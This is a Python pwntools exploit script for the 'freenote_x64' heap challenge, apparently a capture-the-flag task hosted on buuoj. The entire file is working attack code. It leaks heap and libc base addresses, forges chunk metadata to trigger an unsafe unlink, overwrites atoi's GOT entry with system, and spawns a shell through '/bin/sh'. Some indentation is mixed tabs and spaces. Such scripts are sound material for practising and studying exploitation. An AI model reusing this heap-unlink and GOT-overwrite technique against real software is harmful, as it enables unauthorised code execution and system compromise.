#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/12 17:05:11
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 1
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    if context.arch == 'amd64':
        # sh = process(['./freenote_x64'],env={'LD_PRELOAD':'/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so'})
		sh = process('./freenote_x64')
        # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        # one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
    else:
        sh = process(['./freenote_x64'],env={'LD_PRELOAD':'/home/eur1ka/Desktop/Pwn/libc_file/16-32-libc-2.23.so'})
#		sh = process('./')
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_offset = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]
else:
    IP = 'node4.buuoj.cn'
    port = 26274
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF('freenote_x64')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def debug():
    gdb.attach(sh)
    pause()

def cmd(choice):
    sh.recvuntil("Your choice: ")
    sh.sendline(str(choice))
def show():
    cmd(1)

def add(size,content):
    cmd(2)
    sh.recvuntil("Length of new note: ")
    sh.sendline(str(size))
    sh.recvuntil("Enter your note: ")
    sh.sendline(content)

def edit(idx,content):
    cmd(3)
    sh.recvuntil("Note number: ")
    sh.sendline(str(idx))
    sh.recvuntil("Length of note: ")
    sh.sendline(str(len(content)))
    sh.recvuntil("Enter your note: ")
    sh.sendline(content)
def dele(idx):
    cmd(4)
    sh.recvuntil("Note number: ")
    sh.sendline(str(idx))

for i in range (4):
    add(0x80,'a'*0x80)

dele(0)
dele(2)
add(8,'a'*0x8)
add(8,'b'*0x8)
show()
sh.recvuntil("0. aaaaaaaa")
heap_base = u64(sh.recv(4).ljust(8,'\x00')) - 0x1940
unlink_addr = heap_base + 0x30 
sh.recvuntil("2. bbbbbbbb")
libc_base = u64(sh.recv(6).ljust(8,"\x00")) - 0x3c4b78
system_addr = libc_base + libc.symbols['system']
log.info("heap_base=>{}".format(hex(heap_base)))
log.info("libc_base=>{}".format(hex(libc_base)))
for i in range(1,4):
    dele(i)
payload = p64(0x90) + p64(0x81) + p64(unlink_addr-0x10) + p64(unlink_addr-0x8)
payload += 'a' * 0x60
payload += p64(0x80) + p64(0x90)
payload += 'a' *0x80 
payload += p64(0x90) + p64(0x121)
edit(0,payload)
debug()
dele(1)
pause()
string = p64(1) + p64(8)
payload = p64(0) + p64(1) + p64(0x120) + p64(heap_base + 0x18) + p64(1) + p64(8) + p64(elf.got['atoi'])
payload = payload.ljust(0x120,"\x00")
edit(0,payload)
edit(1,p64(system_addr))
cmd("/bin/sh\x00")
sh.interactive()